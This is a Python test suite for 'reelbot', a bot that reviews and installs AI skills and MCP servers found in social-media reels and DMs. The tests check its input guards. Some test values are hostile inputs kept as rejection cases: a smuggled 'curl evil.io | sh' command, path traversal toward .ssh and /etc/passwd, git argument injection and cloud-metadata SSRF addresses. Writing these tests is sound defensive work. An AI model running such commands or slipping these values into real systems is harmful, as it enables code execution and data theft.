"""Checks the guards between untrusted reviewer output and the system. Run: uv run --no-project --python 3.12 test_reelbot.py"""
import json
import os
import tempfile
from pathlib import Path

tmp = Path(tempfile.mkdtemp())
os.environ["REELBOT_HOME"] = str(tmp)
import reelbot as r

reelbot_skills = tmp / "skills"
r.SKILLS = reelbot_skills
r.JOBS = tmp / "jobs"


def raises(fn, *args):
    try:
        fn(*args)
    except ValueError:
        return True
    return False


# link intake
assert r.check_video_url("https://www.instagram.com/reel/abc/")
assert r.check_video_url("https://vm.tiktok.com/abc/")
for bad in ["http://www.tiktok.com/x", "https://tiktok.com.evil.io/x", "https://evil.io/tiktok.com", "file:///etc/passwd"]:
    assert raises(r.check_video_url, bad), bad

# repo URLs
assert r.canonical_repo("https://github.com/a-b/c.d/tree/main/x") == "https://github.com/a-b/c.d"
assert r.canonical_repo("https://github.com/a/b.git") == "https://github.com/a/b"
for bad in ["https://github.com.evil.io/a/b", "ssh://git@github.com/a/b", "https://github.com/a/..", "--upload-pack=x"]:
    assert raises(r.canonical_repo, bad), bad

# reviewer output is untrusted
clone = tmp / "clone"
(clone / "skill").mkdir(parents=True)
(clone / "skill/SKILL.md").write_text("x")
skill = {"kind": "skill", "name": "good-skill", "skill_path": "skill", "runtime": "none", "package": "", "http_url": ""}
assert r.build_action(skill, "https://github.com/a/b", clone)["name"] == "good-skill"
assert raises(r.build_action, {**skill, "name": "../../.ssh"}, "", clone)
assert raises(r.build_action, {**skill, "skill_path": "../.."}, "", clone)
(clone / "skill/link").symlink_to("/etc/passwd")
assert raises(r.build_action, skill, "", clone)
(clone / "skill/link").unlink()

mcp = {**skill, "kind": "mcp", "runtime": "npx", "package": "good-pkg"}
real_check = r.registry_check
r.registry_check = lambda *a: "1.2.3"
assert r.build_action(mcp, "", clone)["cmd"] == ["npx", "-y", "good-pkg@1.2.3"]
assert raises(r.build_action, {**mcp, "package": "x; curl evil.io | sh"}, "", clone)
assert raises(r.build_action, {**mcp, "package": "--foo"}, "", clone)
assert raises(r.build_action, {**mcp, "runtime": "bash"}, "", clone)
assert raises(r.build_action, {**mcp, "runtime": "http", "http_url": "http://evil.io"}, "", clone)
r.registry_check = real_check

# browser plans
good = {"name": "x", "steps": ["a"], "sites": ["app.example.com"]}
assert r.browser_action(good)["sites"] == ["app.example.com"]
assert raises(r.browser_action, {**good, "sites": []})
assert raises(r.browser_action, {**good, "sites": ["*"]})
assert raises(r.browser_action, {**good, "steps": ["a"] * 11})

# a tap runs a job once
job = {"id": "ab" * 6, "state": "pending", "action": {"type": "skill", "name": "good-skill", "path": str(clone / "skill")}}
(r.JOBS / job["id"]).mkdir(parents=True)
r.save(job)
assert r.approve(job["id"]) == "Installed skill good-skill."
assert (reelbot_skills / "good-skill/SKILL.md").exists()
assert r.approve(job["id"]) == "Already done."
assert r.load(job["id"])["state"] == "done"
assert raises(r.load, "../../etc")

# pairing: only the printed code claims the bot, and only once
sent = []
r.tg = lambda method, **params: sent.append(params)
r.CHAT_ID, r.PAIR_CODE, r.ROOT = 0, "abc123", tmp
msg = lambda text, chat: {"message": {"chat": {"id": chat}, "text": text}}
r.handle(msg("wrong", 5))
assert r.CHAT_ID == 0 and not sent
r.handle(msg("abc123", 7))
assert r.CHAT_ID == 7 and (tmp / "chat_id").read_text() == "7"
r.handle(msg("abc123", 9))
assert r.CHAT_ID == 7 and len(sent) == 1

# a repo found only by search gets no install unless the review says it matches
r.find_repo = lambda name: "https://github.com/a/b"
r.fetch_repo = lambda repo, dest: dest.mkdir(parents=True)
r.github_api = lambda path: {"stargazers_count": 1, "created_at": "2026-01-01"}
review = {"verdict": "safe", "findings": [], "matches_video": False, "needs_env": [], **mcp}
r.review_repo = lambda clone, item: review
r.registry_check = lambda *a: "1.2.3"
item = {"kind": "mcp", "name": "x", "source_url": "", "summary": "s", "steps": [], "sites": []}
assert r.process_item(item, "u", "")["action"] is None
assert r.process_item({**item, "source_url": "https://github.com/a/b"}, "u", "")["state"] == "pending"
review["matches_video"] = True
assert r.process_item(item, "u", "")["state"] == "pending"
review["verdict"] = "malicious"
assert r.process_item(item, "u", "")["state"] == "blocked"
r.find_repo = lambda name: (_ for _ in ()).throw(ValueError("none"))
assert "Could not set this up" in r.process_item(item, "u", "")["report"]

# pasted GitHub links: deduped, reviewed, and one tap covers them all
def fake_fetch(repo, dest):
    (dest / "skill").mkdir(parents=True)
    (dest / "skill/SKILL.md").write_text("x")
    (dest / "skill/run.sh").write_text("x")  # code in the skill keeps the Approve step
r.fetch_repo = fake_fetch
r.review_repo = lambda clone, item: {**review, "verdict": "safe", "matches_video": True, "kind": "skill",
                                     "name": item["name"], "skill_path": "skill"}
sent.clear()
r.handle(msg("https://github.com/a/one and https://github.com/a/two/tree/main/x https://github.com/a/one", 7))
tap = [m for m in sent if "reply_markup" in m]
assert len(tap) == 1 and len(sent) == 2  # working notice, then one message with both reports and the question
data = tap[0]["reply_markup"]["inline_keyboard"][0][0]["callback_data"]
assert len(data) <= 64
r.handle({"callback_query": {"id": "1", "from": {"id": 7}, "data": data}})
assert (reelbot_skills / "one/SKILL.md").exists() and (reelbot_skills / "two/SKILL.md").exists()
r.handle({"callback_query": {"id": "2", "from": {"id": 7}, "data": data}})
assert sent[-1]["text"] == "Already done."
r.handle({"callback_query": {"id": "3", "from": {"id": 666}, "data": data}})
assert sent[-1]["text"] == "Already done."

# one failed install does not stop the rest
sent.clear()
r.handle(msg("https://github.com/a/dup https://github.com/a/three", 7))
(reelbot_skills / "dup").mkdir()  # appears between the review and the tap
data = [m for m in sent if "reply_markup" in m][0]["reply_markup"]["inline_keyboard"][0][0]["callback_data"]
r.handle({"callback_query": {"id": "4", "from": {"id": 7}, "data": data}})
assert "dup failed" in sent[-1]["text"] and (reelbot_skills / "three/SKILL.md").exists()

# reject covers the whole set
sent.clear()
r.handle(msg("https://github.com/a/four", 7))
card = [m for m in sent if "reply_markup" in m][0]
assert card["text"].endswith("Go ahead?") and "Would run" not in card["text"] and "Whatever" not in card["text"]
assert [b["text"] for b in card["reply_markup"]["inline_keyboard"][0]] == ["Yes", "No"]
no = [m for m in sent if "reply_markup" in m][0]["reply_markup"]["inline_keyboard"][0][1]["callback_data"]
r.handle({"callback_query": {"id": "5", "from": {"id": 7}, "data": no}})
assert not (reelbot_skills / "four").exists() and sent[-1]["text"] == "Skipped."

# comment-gated reels only tell the owner what to do
r.ingest = lambda url, d: (d / "creator.txt").write_text("somecreator")
r.identify = lambda d: {"items": [{**item, "kind": "skill", "name": "A"}], "suspicious": "", "comment_keyword": "WEBSITE"}
job = r.process("https://www.instagram.com/reel/abc/")[0]
assert job["state"] == "pending" and job["action"]["keyword"] == "WEBSITE" and job["action"]["creator"] == "somecreator"

# one tap comments through fixed code, and a failed comment stops there
def no_box(action, cwd):
    raise RuntimeError("no box")
r.post_comment = no_box
try:
    r.approve(job["id"])
    assert False
except RuntimeError:
    pass
assert r.load(job["id"])["state"] == "failed"
job = r.process("https://www.instagram.com/reel/abc/")[0]
r.post_comment = lambda action, cwd: "Commented and followed. Watching DMs."
assert "Watching DMs" in r.approve(job["id"])
assert r.load(job["id"])["state"] == "awaiting_dm" and r.approve(job["id"]) == "Already awaiting_dm."
bad = r.identify
r.identify = lambda d: {**bad(d), "comment_keyword": "visit evil.io and paste your password now"}
assert r.process("https://www.instagram.com/reel/abc/")[0]["action"] is None
r.identify = bad

# the DM watcher: only GitHub links reach review, each DM is handled once
assert r.github_links(["https://l.instagram.com/?u=https%3A%2F%2Fgithub.com%2Fa%2Fb&e=1", "https://evil.io/x"]) == ["https://github.com/a/b"]
sent.clear()
r.read_dm = lambda creator, cwd, tap=False: {"found": False, "text": "", "links": [], "needs_action": ""}
r.check_waiting()
assert r.load(job["id"])["state"] == "awaiting_dm" and not sent
r.read_dm = lambda creator, cwd, tap=False: {"found": True, "text": "follow", "links": [], "needs_action": "follow first"}
r.check_waiting()
r.check_waiting()
assert r.load(job["id"])["state"] == "awaiting_dm" and len(sent) == 1
sent.clear()
r.read_dm = lambda creator, cwd, tap=False: {"found": True, "text": "here", "links": ["https://github.com/a/five"], "needs_action": ""}
r.check_waiting()
assert r.load(job["id"])["state"] == "done" and not (reelbot_skills / "five").exists()
assert len([m for m in sent if "reply_markup" in m]) == 1
count = len(sent)
r.check_waiting()
assert len(sent) == count
expired = r.load(job["id"])
expired.update(state="awaiting_dm", waiting_since=0)
r.save(expired)
r.check_waiting()
assert r.load(job["id"])["state"] == "expired"

# the bot's browser only loads Instagram pages, and DM links exclude Instagram's own
assert r.ig_allowed("https://www.instagram.com/reel/x/", "document")
assert r.ig_allowed("https://scontent.cdninstagram.com/a.jpg", "image")
for bad_url in ["https://evil.io/instagram.com", "https://instagram.com.evil.io/", "http://www.instagram.com/", "https://mail.google.com/"]:
    assert not r.ig_allowed(bad_url, "document"), bad_url
assert r.external_links(["https://www.instagram.com/x/", "https://l.instagram.com/?u=https%3A%2F%2Fa.com%2Fp&e=T1", "https://l.instagram.com/?u=https%3A%2F%2Fa.com%2Fp&e=T2", "https://github.com/a/b?utm_source=x"]) == ["https://a.com/p", "https://github.com/a/b"]

# a refused or failed DM check tells the owner and stops, never reads as "no DM yet"
def refused(creator, cwd, tap=False):
    raise RuntimeError("refused")
r.read_dm = refused
sent.clear()
stuck = r.load(job["id"])
stuck.update(state="awaiting_dm", waiting_since=r.time.time())
r.save(stuck)
for _ in range(3):  # one Instagram hiccup must not end the watch
    r.check_waiting()
assert r.load(job["id"])["state"] == "failed" and "refused" in sent[-1]["text"]

# untapped install only for text-only skills from a link the owner sent, with every check passed
def text_fetch(body):
    def fetch(repo, dest):
        (dest / "skill").mkdir(parents=True)
        (dest / "skill/SKILL.md").write_text(body)
    return fetch
good_review = r.review_repo
r.fetch_repo = text_fetch("plain text")
sent.clear()
r.handle(msg("https://github.com/a/six", 7))
assert (reelbot_skills / "six/SKILL.md").exists() and not [m for m in sent if "reply_markup" in m]
assert "Passed every check" in sent[-1]["text"]

def needs_tap(name):
    sent.clear()
    r.handle(msg(f"https://github.com/a/{name}", 7))
    assert not (reelbot_skills / name).exists(), name
    assert len([m for m in sent if "reply_markup" in m]) == 1, name

r.fetch_repo = text_fetch("hello\u200bhidden")
needs_tap("seven")
r.fetch_repo = text_fetch("plain text")
r.review_repo = lambda clone, item: {**good_review(clone, item), "verdict": "risky"}
needs_tap("eight")
r.review_repo = lambda clone, item: {**good_review(clone, item), "matches_video": False}
needs_tap("nine")
r.review_repo = good_review
r.fetch_repo = fake_fetch
needs_tap("ten")

# links not sent by the owner never install untapped
r.fetch_repo = text_fetch("plain text")
assert r.process_links(["https://github.com/a/eleven"])[0]["state"] == "pending"
assert not (reelbot_skills / "eleven").exists()

# builds: file tools only, in a fresh folder under BUILDS
r.BUILDS = tmp / "builds"
calls = []
class Done:
    stdout, stderr = json.dumps({"is_error": False, "result": "done"}), ""
def fake_claude(cmd, cwd, **kwargs):
    calls.append((cmd, cwd))
    (cwd / "index.html").write_text("x")
    return Done
real_run = r.subprocess.run
r.subprocess.run = fake_claude
build = {**item, "kind": "build", "name": "../../Evil App!", "brief": "a tip calculator"}
report = r.process_item(build, "u", "")
cmd, cwd = calls[0]
assert "Built in" in report["report"] and report["action"] is None and report["state"] == "done"
assert cwd.parent == r.BUILDS and cwd.name.startswith("evil-app-")
assert "--restricted" in cmd and "--no-chrome" in cmd and "--strict-mcp-config" in cmd
tools = cmd[cmd.index("--tools") + 1]
assert tools == "Read,Write,Edit,Glob,Grep,Bash" and "a tip calculator" in cmd[2]
sandbox = json.loads(cmd[cmd.index("--settings") + 1])["sandbox"]
assert sandbox["enabled"] and sandbox["failIfUnavailable"] and not sandbox["allowUnsandboxedCommands"]
assert sandbox["filesystem"]["denyRead"] == ["~/"] and "github.com" not in sandbox["network"]["allowedDomains"]
r.subprocess.run = lambda cmd, cwd, **kwargs: Done
assert "no files" in r.process_item(build, "u", "")["report"]
r.subprocess.run = real_run

# skills.sh links map to their GitHub repo, and two watches on one creator review a DM once
assert r.github_links(["https://www.skills.sh/vercel-labs/skills/find-skills"]) == ["https://github.com/vercel-labs/skills/tree/HEAD/skills/find-skills"]
assert r.github_links(["https://skills.sh/only-one"]) == []
reviews = []
real_links = r.process_links
r.process_links = lambda urls: reviews.append(urls) or []
watches = [r.new_job("u"), r.new_job("u")]
for watch in watches:
    watch.update(state="awaiting_dm", creator="samecreator", waiting_since=r.time.time())
    r.save(watch)
r.read_dm = lambda creator, cwd, tap=False: {"found": True, "text": "x", "links": ["https://github.com/a/b"], "needs_action": ""}
sent.clear()
r.check_waiting()
assert len(reviews) == 1 and sorted(r.load(w["id"])["state"] for w in watches) == ["awaiting_dm", "done"]
r.check_waiting()
assert len(reviews) == 1  # the same link is never reviewed twice
r.read_dm = lambda creator, cwd, tap=False: {"found": True, "text": "x", "links": ["https://github.com/a/b", "https://github.com/a/new"], "needs_action": ""}
r.check_waiting()
assert reviews[-1] == ["https://github.com/a/new"]  # only the new link counts

# non-GitHub links build in the sandbox from the page text, and private addresses are refused
assert r.page_text("<style>a{}</style><p>Build &amp; ship</p><script>x()</script>") == "Build & ship"
for bad_url in ["http://example.com/", "https://127.0.0.1/", "https://[::1]/", "https://10.0.0.1/", "https://169.254.169.254/latest"]:
    assert raises(r.check_public, bad_url), bad_url
built = []
r.fetch_page = lambda url: ("a tool that does a useful thing for people", [])
r.build_project = lambda item, job_id: built.append(item) or Path("/tmp/made")
sent.clear()
r.handle(msg("https://notion.so/some-guide", 7))
assert built[-1]["name"] == "some-guide" and "useful thing" in built[-1]["brief"] and "Built in /tmp/made" in sent[-1]["text"]
watch = r.new_job("u")
watch.update(state="awaiting_dm", creator="docmaker", waiting_since=r.time.time())
r.save(watch)
r.read_dm = lambda creator, cwd, tap=False: {"found": True, "text": "x", "links": ["https://example.com/guide"], "needs_action": ""}
count = len(built)
r.check_waiting()
assert len(built) == count + 1 and r.load(watch["id"])["state"] == "done"
def unreadable(url):
    raise ValueError("no text")
r.fetch_page = unreadable
assert "Couldn't read" in r.build_from_link("https://example.com/y")[0]["report"]

# a skill that is already installed is reported, with nothing to approve
r.process_links = real_links
(reelbot_skills / "here").mkdir()
r.fetch_repo = fake_fetch
sent.clear()
r.handle(msg("https://github.com/a/here", 7))
assert "is already installed" in sent[-1]["text"] and not [m for m in sent if "reply_markup" in m]

# real-life cases: links, documents, plain text, resends
r.fetch_repo = fake_fetch
r.process_links = real_links
reviewed = []
r.process_links = lambda urls, auto=False: reviewed.append((urls, auto)) or []
sent.clear()
r.fetch_page = lambda url: ("a landing page with enough words in it to be read", [url, "https://github.com/real/tool", "https://github.com/features/actions"])
assert r.build_from_link("https://bit.ly/x") == [] and reviewed[-1] == (["https://github.com/real/tool"], False)
r.fetch_page = lambda url: ("redirected page text long enough to read here", ["https://github.com/final/repo"])
r.build_from_link("https://bit.ly/y")
assert reviewed[-1][0] == ["https://github.com/final/repo"]

r.fetch_page = lambda url: ("docs telling you how to set this product up step by step", [url, "https://github.com/vercel/vercel"])
count = len(built)
reviews_before = len(reviewed)
r.build_from_link("https://vercel.com/docs/start")
assert len(built) == count + 1 and len(reviewed) == reviews_before  # footer links to the site's own org are ignored

count = len(built)
sent.clear()
r.handle(msg("Build me a landing page for my dog walking business with a booking form", 7))
assert len(built) == count + 1 and "Built in /tmp/made" in sent[-1]["text"]
sent.clear()
r.handle(msg("hi", 7))
assert "Send a link" in sent[-1]["text"] and len(built) == count + 1
sent.clear()
r.handle({"message": {"chat": {"id": 7}}})
assert "Send a link" in sent[-1]["text"]
r.handle(msg("look at http://github.com/a/shared.", 7))
assert reviewed[-1] == (["https://github.com/a/shared"], True)
r.document_text = lambda doc: "Step one, make a page that lists my recipes and lets me search them all."
sent.clear()
r.handle({"message": {"chat": {"id": 7}, "document": {"file_id": "f", "file_name": "My Guide.pdf"}}})
assert built[-1]["name"] == "My Guide" and "lists my recipes" in built[-1]["brief"]
r.document_text = lambda doc: "Install from https://github.com/doc/tool please, it is a very nice tool to have."
r.handle({"message": {"chat": {"id": 7}, "document": {"file_id": "f"}}})
assert reviewed[-1] == (["https://github.com/doc/tool"], False)  # a file may come from anyone, so it never auto-installs
sent.clear()
r.send_jobs([])
assert "couldn't find" in sent[-1]["text"]

# a resent reel is never commented on twice, even if two Approves were already waiting
reel_a = "https://www.instagram.com/reel/SAMECODE/?igsh=1"
reel_b = "https://www.instagram.com/reels/SAMECODE/"
comment = {"type": "comment", "name": "GO", "keyword": "GO", "creator": "c", "reel_url": reel_a}
first, second = r.new_job(reel_a), r.new_job(reel_a)
for j in (first, second):
    j.update(state="pending", action=dict(comment), creator="c")
    r.save(j)
r.post_comment = lambda action, cwd: "Commented."
r.approve(first["id"])
assert r.approve(second["id"]).startswith("Already commented") and r.load(second["id"])["state"] == "done"
ingested = []
r.ingest = lambda url, d: ingested.append(url)
again = r.process(reel_b)[0]
assert "won't post again" in again["report"] and again["action"] is None and not ingested

# a Follow button only counts when the page shows no Following, a skipped word is not a crash, and offsets survive
assert r.reel_code("https://www.instagram.com/p/AbC_d-1/") == "AbC_d-1" and r.reel_code("https://www.tiktok.com/@a/video/1") == ""
assert r.github_links(["https://github.com/features/copilot", "https://github.com/a/a", "https://github.com/a/a"]) == ["https://github.com/a/a"]
fail_watch = r.new_job("u")
fail_watch.update(state="awaiting_dm", creator="flaky", waiting_since=r.time.time())
r.save(fail_watch)
def flaky(creator, cwd, tap=False):
    raise OSError("network")
r.read_dm = flaky
sent.clear()
for expected in ("awaiting_dm", "awaiting_dm", "failed"):
    r.check_waiting()
    assert r.load(fail_watch["id"])["state"] == expected
assert len([m for m in sent if "@flaky" in m["text"]]) == 1
tap_watch = r.new_job("u")
tap_watch.update(state="awaiting_dm", creator="tapper", waiting_since=r.time.time())
r.save(tap_watch)
seen_tap = []
r.read_dm = lambda creator, cwd, tap=False: seen_tap.append(tap) or {"found": True, "text": "x", "links": [], "tapped": "I'm following" if tap == [] else ""}
sent.clear()
r.check_waiting()
r.check_waiting()
assert seen_tap == [[], ["i'm following"]] and "Answered" in sent[0]["text"]
# a reply the funnel ignored comes back to the owner once, as a tap to make
assert len(sent) == 2 and "didn't react" in sent[1]["text"] and "I'm following" in sent[1]["text"]
r.check_waiting()
assert len(sent) == 2
finished = r.load(tap_watch["id"]); finished["state"] = "expired"; r.save(finished)

# a button that opens a link feeds the normal path, and tapping stops after three presses
btn_watch = r.new_job("u")
btn_watch.update(state="awaiting_dm", creator="buttoner", waiting_since=r.time.time(), taps=["a", "b", "c"])
r.save(btn_watch)
asked = []
r.read_dm = lambda creator, cwd, tap=None: asked.append(tap) or {"found": True, "text": "x", "links": [], "tapped": ""}
r.check_waiting()
assert None in asked
linked = r.new_job("u")
linked.update(state="awaiting_dm", creator="linker", waiting_since=r.time.time())
r.save(linked)
r.load(btn_watch["id"])
done = r.load(btn_watch["id"]); done["state"] = "expired"; r.save(done)
got = []
r.process_links = lambda urls, auto=False: got.append(urls) or []
for j in r.JOBS.glob("*/job.json"):
    other = json.loads(j.read_text())
    if other["state"] == "awaiting_dm" and other["id"] != linked["id"]:
        other["state"] = "expired"; r.save(other)
r.read_dm = lambda creator, cwd, tap=None: {"found": True, "text": "x", "links": ["https://github.com/btn/repo"], "tapped": "Get the link"}
sent.clear()
r.check_waiting()
assert got == [["https://github.com/btn/repo"]] and r.load(linked["id"])["taps"] == ["get the link"] and r.load(linked["id"])["state"] == "done"

# a DM button the website doesn't draw tells the owner once which one to tap, and keeps watching
app_only = r.new_job("u")
app_only.update(state="awaiting_dm", creator="apponly", waiting_since=r.time.time(), told=True)
r.save(app_only)
r.read_dm = lambda creator, cwd, tap=None: {"found": True, "text": "Click below", "links": [], "tapped": "", "buttons": ["Send me the link"]}
sent.clear()
r.check_waiting()
r.check_waiting()
assert len(sent) == 1 and "Send me the link" in sent[0]["text"] and r.load(app_only["id"])["state"] == "awaiting_dm"
done = r.load(app_only["id"]); done["state"] = "expired"; r.save(done)

# button data: only this creator's own messages count, and a button already answered is not asked for again
def xma_node(when, sender, *buttons):
    return {"node": {"timestamp_ms": str(when), "sender_fbid": sender, "content": {"xma": {"cta_buttons": list(buttons)}}}}
open_btn = {"title": "Open", "action_url": "https://my.manychat.com/r?act=1", "cta_type": "xma_web_url"}
old_btn = {"title": "Send me the link", "action_url": "", "cta_type": "postback"}
new_btn = {"title": "One more step", "action_url": "", "cta_type": "postback"}
thread = {"thread_key": "9", "users": [{"username": "Creator"}], "slide_messages": {"edges": [xma_node(1, "9", old_btn), {"node": {"timestamp_ms": "2", "sender_fbid": "me"}}, xma_node(3, "9", open_btn, new_btn)]}}
stranger = {"thread_key": "5", "users": [{"username": "other"}], "slide_messages": {"edges": [xma_node(9, "5", {"title": "X", "action_url": "https://evil.example/"})]}}
group = {"thread_key": "7", "users": [{"username": "creator"}, {"username": "other"}], "slide_messages": {"edges": [xma_node(9, "5", {"title": "Y", "action_url": "https://evil.example/2"})]}}
assert r.chat_buttons([{"data": [thread, {"x": stranger}, group]}], "creator") == (["https://my.manychat.com/r?act=1"], ["One more step"])
assert r.chat_buttons([{"data": {"slide_messages": {}}}], "creator") == ([], [])

# a link that redirects onto a repo means only that repo, not GitHub's own menu links
real_fetch = r.fetch_page
r.fetch_page = lambda url: ("x" * 300, ["https://github.com/real/repo?mcp_token=abc", "https://github.com/solutions/industry", "https://github.com/resources/articles"])
got.clear()
r.build_from_link("https://my.manychat.com/r?act=1")
assert got == [["https://github.com/real/repo"]]
# a tracking link is named after where it landed, not its token
named = []
real_build = r.build_from_text
r.build_from_text = lambda name, text, summary: named.append((name, summary)) or []
r.fetch_page = lambda url: ("a guide with enough words in it to be read", ["https://chen.example/guides/good-name"])
r.build_from_link("https://app.example/api/click/eyJhbGciOi")
assert named == [("good-name", "Built from the page at https://chen.example/guides/good-name")]
r.build_from_text = real_build
r.fetch_page = real_fetch
with tempfile.TemporaryDirectory() as d:
    base = Path(d)
    for folder in ("skills/real", ".claude/skills/published", ".automations/triage/skills/triage", ".vc/x"):
        (base / folder).mkdir(parents=True)
        (base / folder / "SKILL.md").write_text("x")
    assert [str(f.relative_to(base)) for f in r.skill_dirs(base)] == [".claude/skills/published", "skills/real"]

# a repo of many skills installs them all on one tap, and a link to one folder takes only that
def many_fetch(repo, dest):
    for folder, body in [("skills/alpha", "---\nname: Alpha Skill\n---\nx"), ("skills/beta", "no front matter"),
                         ("skills/gamma", "---\nname: ../../evil\n---\nx"), ("tests/fake", "x"), ("node_modules/dep", "x")]:
        (dest / folder).mkdir(parents=True)
        (dest / folder / "SKILL.md").write_text(body)
r.fetch_repo = many_fetch
r.process_links = real_links
r.review_repo = lambda clone, item: {**review, "verdict": "safe", "matches_video": True, "kind": "skill", "name": "whatever", "skill_path": "skills/alpha"}
(reelbot_skills / "beta").mkdir()
sent.clear()
r.handle(msg("https://github.com/many/skills", 7))
tap = [m for m in sent if "reply_markup" in m]
assert len(tap) == 1 and "1 already installed" in sent[1]["text"]
assert not (reelbot_skills / "alpha-skill").exists()  # many at once always waits for the tap
r.handle({"callback_query": {"id": "9", "from": {"id": 7}, "data": tap[0]["reply_markup"]["inline_keyboard"][0][0]["callback_data"]}})
assert (reelbot_skills / "alpha-skill/SKILL.md").exists() and not (reelbot_skills / "fake").exists() and not (reelbot_skills / "dep").exists()
assert "Installed" in sent[-1]["text"] and (reelbot_skills / "evil").exists() is True and not (tmp / "evil").exists()

clone_many = tmp / "many"
many_fetch("", clone_many.mkdir() or clone_many)
base_review = {**review, "verdict": "safe", "kind": "skill", "name": "wrong-name", "skill_path": "skills/alpha"}
one = r.build_action(base_review, "https://github.com/m/s", clone_many, "https://github.com/m/s/tree/main/skills/beta")
assert one["type"] == "skill" and one["name"] == "beta" and one["path"].endswith("skills/beta")
blob = r.build_action(base_review, "https://github.com/m/s", clone_many, "https://github.com/m/s/blob/main/skills/beta/SKILL.md")
assert blob["name"] == "beta"
folder = r.build_action(base_review, "https://github.com/m/s", clone_many, "https://github.com/m/s/tree/main/skills")
assert folder["type"] == "skills" and len(folder["skills"]) == 3
out = r.build_action(base_review, "https://github.com/m/s", clone_many, "https://github.com/m/s/tree/main/../../../etc")
assert out["type"] == "skills"  # a path that escapes the repo falls back to the repo itself
assert r.build_action({**base_review, "kind": "none"}, "https://github.com/m/s", clone_many)["type"] == "skills"

# /list shows what is still installed, with its description, and nothing that was removed
r.JOBS = tmp / "list-jobs"
r.CLAUDE_CONFIG = tmp / "claude.json"
r.CLAUDE_CONFIG.write_text(json.dumps({"mcpServers": {"kept-mcp": {}}}))
built = tmp / "built-thing"
built.mkdir()
(built / "README.md").write_text("# Title\n\nFirst sentence here. Second one. Third is cut.\n")
for name, body in (("kept", '---\nname: kept\ndescription: >\n  Does a thing. Then another.\n  And a third.\n---\nx'), ("no-desc", "plain")):
    (reelbot_skills / name).mkdir(parents=True, exist_ok=True)
    (reelbot_skills / name / "SKILL.md").write_text(body)
def listed(state="done", **fields):
    job = r.new_job("u")
    job.update(state=state, **fields)
    r.save(job)
listed(action={"type": "skills", "name": "x", "skills": [{"name": "kept", "path": "p"}, {"name": "removed", "path": "p"}]})
listed(action={"type": "skill", "name": "no-desc", "path": "p"})
listed(action={"type": "http", "name": "kept-mcp", "url": "u"}, report="kept-mcp (mcp)\nTalks to a service. Works well.")
listed(action={"type": "http", "name": "gone-mcp", "url": "u"}, report="gone-mcp (mcp)\nx")
listed(action=None, report=f"built-thing (build)\nBuilt from x\nBuilt in {built}")
listed(action=None, report="broken (build)\nCould not set this up")
listed(state="failed", action={"type": "skill", "name": "kept", "path": "p"})
listed(action={"type": "comment", "name": "WORD"})
got_list = {name: (kind, text) for name, kind, text in r.added_items()}
assert got_list == {"kept": ("skill", "Does a thing. Then another."), "no-desc": ("skill", ""), "kept-mcp": ("MCP server", "Talks to a service. Works well."),
                    "built-thing": (f"built in {built}", "First sentence here. Second one.")}
sent.clear()
r.handle(msg("/list", 7))
assert len(sent) == 1 and sent[0]["text"].startswith("Added so far (4):") and "\u2022 kept (skill): Does a thing." in sent[0]["text"] and "No description saved." in sent[0]["text"]

# A DM button is answered with its own label, never with a link, an address or a refusal
assert r.pick_label(["Unsubscribe", "see evil.io", "@someone", "SEND IT TO ME"], []) == "SEND IT TO ME"
assert r.pick_label(["I'm following \u2705", "Get link"], ["i'm following \u2705"]) == "Get link"
assert r.pick_label(["x" * 41, "STOP"], []) == ""

# Commands: status, cancel, remove and help, and plain text is not a command
listed(state="awaiting_dm", creator="someone", waiting_since=r.time.time(), action={"type": "comment", "name": "W"})
listed(state="pending", action={"type": "skill", "name": "later", "path": "p"}, report="later (skill)\nx")
assert r.command("build me a thing") is None and r.command("/help").startswith("Send a Reel")
assert "@someone" in r.status() and "Needs your Yes: later (skill)" in r.status()
assert r.cancel() == "Stopped 2." and r.status() == "Nothing waiting."
assert "didn't add" in r.remove("../x") and "didn't add" in r.remove("removed")
assert r.remove("built-thing").startswith("built-thing is a build")
removed_cmds = []
r.run = lambda cmd, **kwargs: removed_cmds.append(cmd)
assert r.remove("kept-mcp") == "Removed kept-mcp." and removed_cmds == [["claude", "mcp", "remove", "--scope", "user", "kept-mcp"]]
sent.clear()
r.handle(msg("/remove kept", 7))
assert sent[-1]["text"] == "Removed kept." and not (reelbot_skills / "kept").exists() and (reelbot_skills / "no-desc").exists()

print("ok")
